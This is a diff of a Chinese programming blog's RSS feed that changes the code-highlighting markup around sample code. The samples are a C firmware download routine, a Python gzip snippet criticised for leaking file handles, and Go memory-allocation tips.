+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    VOS_BOOL enIsHaveUpdateOk = VOS_FALSE;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    VOS_INT siRet;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    BOOTTRACE(TRACE_TIP, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;Checking and updating files...&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt;(LOAD_Init()==VOS_FALSE) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        BOOTTRACE(TRACE_ERR, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;The LOAD Init return error&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; VOS_ERR;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    siRet=LOAD_Begin(LD_STAGE_INSCHK, &amp;amp;g_downloadFileCount, g_pstFileListInfo, LD_ONLINE_UPDATE);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt;(siRet != VOS_OK) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        LOAD_End();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        BOOTTRACE(TRACE_ERR, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;The LOAD Begin return error&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; VOS_ERR;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;while&lt;/span&gt;(VOS_TRUE) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;for&lt;/span&gt;(count=&lt;span style=&#34;color:#b452cd&#34;&gt;0&lt;/span&gt;;count&amp;lt;g_downloadFileCount;count++) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (g_pstFileListInfo[count].enLoadCheckResult == LS_SUCESS_UPDATE ) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                enIsHaveUpdateOk = VOS_TRUE;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;for&lt;/span&gt;(count=&lt;span style=&#34;color:#b452cd&#34;&gt;0&lt;/span&gt;;count&amp;lt;g_downloadFileCount;count++) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (g_pstFileListInfo[count].enLoadCheckResult != LS_SUCESS_UPDATE &amp;amp;&amp;amp;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                (g_pstFileListInfo[count].enLoadCheckResult != LS_NOT_NEED_UPDATE) &amp;amp;&amp;amp;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                (g_pstFileListInfo[count].enLoadCheckResult != LS_OMU_NORESPONSE) &amp;amp;&amp;amp;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                (g_pstFileListInfo[count].enLoadCheckResult != LS_OMU_REFUSE)) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                BOOTTRACE(TRACE_ERR, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;update file %s error and result=%d&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    g_pstFileListInfo[count].acFileName,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    g_pstFileListInfo[count].enLoadCheckResult);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;break&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; ((g_pstFileListInfo[count].enLoadCheckResult != LS_OMU_NORESPONSE) &amp;amp;&amp;amp;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                (enIsHaveUpdateOk == VOS_TRUE) ) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                BOOTTRACE(TRACE_ERR, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;Not all files are updated,download these file again&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;break&lt;/span&gt;;    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; ((g_pstFileListInfo[count].enLoadCheckResult != LS_OMU_REFUSE) &amp;amp;&amp;amp;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                (enIsHaveUpdateOk == VOS_TRUE) ) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                BOOTTRACE(TRACE_ERR, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;Not all files version are consistent with inschk,download these file again&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;break&lt;/span&gt;;    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; ((g_pstFileListInfo[count].enLoadCheckResult != LS_OMU_NORESPONSE) &amp;amp;&amp;amp;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                (g_pstFileListInfo[count].bLocalCheck = VOS_FALSE) ) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                BOOTTRACE(TRACE_ERR, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;Fail to connect witch OMU server and local file %s is uncertain, I will still download these files&amp;#34;&lt;/span&gt;, g_pstFileListInfo[count].acFileName);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;break&lt;/span&gt;;    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; ((g_pstFileListInfo[count].enLoadCheckResult != LS_OMU_REFUSE) &amp;amp;&amp;amp;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                (g_pstFileListInfo[count].bLocalCheck = VOS_FALSE) ) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                BOOTTRACE(TRACE_ERR, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;OMU fesuse to update and %s local check result=%d or some file updated&amp;#34;&lt;/span&gt;, g_pstFileListInfo[count].acFileName, g_pstFileListInfo[count].bLocalCheck);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;break&lt;/span&gt;;    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (g_pstFileListInfo[count].ucFileType == PROG_FILE_TYPE ) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                siRet = snprintf_s(ascExcuteFile, &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;sizeof&lt;/span&gt;(ascExcuteFile),  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;sizeof&lt;/span&gt;(ascExcuteFile)-&lt;span style=&#34;color:#b452cd&#34;&gt;1&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                         &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;%s/%s&amp;#34;&lt;/span&gt;, g_pstFileListInfo[count].acFileExecuteDir, g_pstFileListInfo[count].acFileName);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (siRet &amp;lt;= &lt;span style=&#34;color:#b452cd&#34;&gt;0&lt;/span&gt; ) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    BOOTTRACE(TRACE_ERR, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;[%s:%d] snprintf_s failed,&amp;#34;&lt;/span&gt;, __FUNCTION__, __LINE__);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;break&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                (&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt;)chmod(ascExcuteFile, S_IRUSE | S_IXUSR);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (count == g_downloadFileCount) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            BOOTTRACE(TRACE_TIP, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;All %d files checked or updated OK.&amp;#34;&lt;/span&gt;, g_downloadFileCount);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;for&lt;/span&gt;(count=&lt;span style=&#34;color:#b452cd&#34;&gt;0&lt;/span&gt;;count&amp;lt;g_downloadFileCount;count++) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                BOOTTRACE(TRACE_LOD, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;%d update result is %d and local check result is %d.&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                 g_pstFileListInfo[count].acFileName, g_pstFileListInfo[count].enLoadCheckResult,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                 g_pstFileListInfo[count].bLocalCheck);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;break&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        } &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;else&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (g_pstFileListInfo[count].enLoadCheckResult == LS_DISK_FULL){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                sleepTimeLen=INSTALL_DISK_FULL_AGAIN_TIMELEN;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            } &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;else&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                sleepTimeLen=INSTALL_CONNECT_OMU_AGAIN_TIMELEN;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            BOOTTRACE(TRACE_ERR, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;Update file error so sleep for %d second and try again&amp;#34;&lt;/span&gt;, sleepTimeLen);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            SLEEP(sleepTimeLen);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            siRet=LOAD_Begin(LD_STAGE_INSCHK, &amp;amp;g_downloadFileCount, g_pstFileListInfo, LD_ONLINE_UPDATE);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt;(siRet != VOS_OK) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                LOAD_End();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                BOOTTRACE(TRACE_ERR, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;The LOAD Begin return error&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; VOS_ERR;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    BOOTTRACE(TRACE_DBG, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;Exit STARTER_Download&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    LOAD_End();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; VOS_OK;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的代码我已是删除了每个条件判断的注释，但是代码看起还是有点长。如果不仔细读，还真不看出不函数完成的功能。再来看优化重构之后的代码：&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -1045,15 +1060,15 @@ at oracle.&lt;span style=&#34;color:#658b00&#34;&gt;jdbc&lt;/span&gt;.&lt;span s
       <guid>http://lanlingzi.cn/post/technical/2020/0516_code/</guid>
       <description>&lt;h1 id=&#34;案例&#34;&gt;案例&lt;/h1&gt;
 &lt;p&gt;下面的代码来自我们某一工具源码(Python语言)中：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;file_gz = gzip.GzipFile(file_name)
-src_path, src_file = os.path.split(file_name)
-tmp_file_name = os.path.join(path_name, src_file).strip(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;gz&amp;#39;&lt;/span&gt;).strip(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;)
-tmp_file = &lt;span style=&#34;color:#658b00&#34;&gt;open&lt;/span&gt;(tmp_file_name, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;)
-tmp_file.writeline(file_gz.realines())
-file_gz.close()
-tmp_file.close()
-os.remove(file_name)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;从代码健壮角度来看，存在如下两个问题：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;file_gz = gzip.GzipFile(file_name)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;src_path, src_file = os.path.split(file_name)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tmp_file_name = os.path.join(path_name, src_file).strip(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;gz&amp;#39;&lt;/span&gt;).strip(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tmp_file = &lt;span style=&#34;color:#658b00&#34;&gt;open&lt;/span&gt;(tmp_file_name, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tmp_file.writeline(file_gz.realines())
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;file_gz.close()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tmp_file.close()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;os.remove(file_name)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;从代码健壮角度来看，存在如下两个问题：&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;缺少捕获异常，在GzipFile打开文件，open打开文件之后的操作都可能抛出异常&lt;/li&gt;
 &lt;li&gt;当抛出异常时，file_gz与tmp_file就会出现未正常close，存在文件句柄的泄露问题&lt;/li&gt;
@@ -1706,20 +1721,20 @@ os.remove(file_name)
 &lt;h3 id=&#34;小对象合并成结构体一次分配减少内存分配次数&#34;&gt;小对象合并成结构体一次分配，减少内存分配次数&lt;/h3&gt;
 &lt;p&gt;做过C/C++的同学可能知道，小对象在堆上频繁地申请释放，会造成内存碎片（有的叫空洞），导致分配大的对象时无法申请到连续的内存空间，一般建议是采用内存池。Go runtime底层也采用内存池，但每个span大小为4k，同时维护一个cache。cache有一个0到n的list数组，list数组的每个单元挂载的是一个链表，链表的每个节点就是一块可用的内存，同一链表中的所有节点内存块都是大小相等的；但是不同链表的内存大小是不等的，也就是说list数组的一个单元存储的是一类固定大小的内存块，不同单元里存储的内存块大小是不等的。这就说明cache缓存的是不同类大小的内存对象，当然想申请的内存大小最接近于哪类缓存内存块时，就分配哪类内存块。当cache不够再向spanalloc中分配。&lt;/p&gt;
 &lt;p&gt;建议：小对象合并成结构体一次分配，示意如下：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;for k, v := range m {
-    k, v := k, v // copy for capturing by the goroutine
-    go func() {
-        // using k &amp;amp; v
-    }()
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;替换为：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;for k, v := range m {
-    x := struct {k , v string} {k, v} // copy for capturing by the goroutine
-    go func() {
-        // using x.k &amp;amp; x.v
-    }()
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;for k, v := range m {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    k, v := k, v // copy for capturing by the goroutine
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    go func() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        // using k &amp;amp; v
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;替换为：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;for k, v := range m {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    x := struct {k , v string} {k, v} // copy for capturing by the goroutine
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    go func() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        // using x.k &amp;amp; x.v
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
     </item>
     
     <item>
